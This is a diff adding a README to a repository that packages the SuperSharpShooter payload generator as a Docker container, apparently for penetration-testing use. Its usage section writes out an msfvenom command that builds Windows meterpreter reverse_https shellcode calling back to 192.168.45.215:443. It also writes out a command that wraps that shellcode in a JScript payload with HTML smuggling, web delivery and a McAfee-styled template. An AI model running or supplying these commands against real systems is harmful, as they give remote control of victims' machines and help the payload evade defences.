@@ -1,3 +1,22 @@
+# Containerized SuperSharpShooter 
+
+This repository is just to execute https://github.com/SYANiDE-/SuperSharpShooter as a container.
+## Usage
+```shell
+git clone https://github.com/yosh1s/SuperSharpShooter.git 
+
+cd SuperSharpShooter
+
+docker build -t super-sharp-shooter .
+
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.215 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp | sed '1s/^[^{]*{//; $s/}.*$//' > csharpsc.txt
+
+docker run --rm -it -v "$(pwd)":/app/ super-sharp-shooter --payload js --dotnetver 4 --scfile ./csharpsc.txt --output hoge --delivery web --web http://192.168.45.215/hoge.payload --smuggle --template mcafee --shellcode
+```
+
+
+## Original README
+
 Forking... and fixing a couple of things.
 
 What's new:
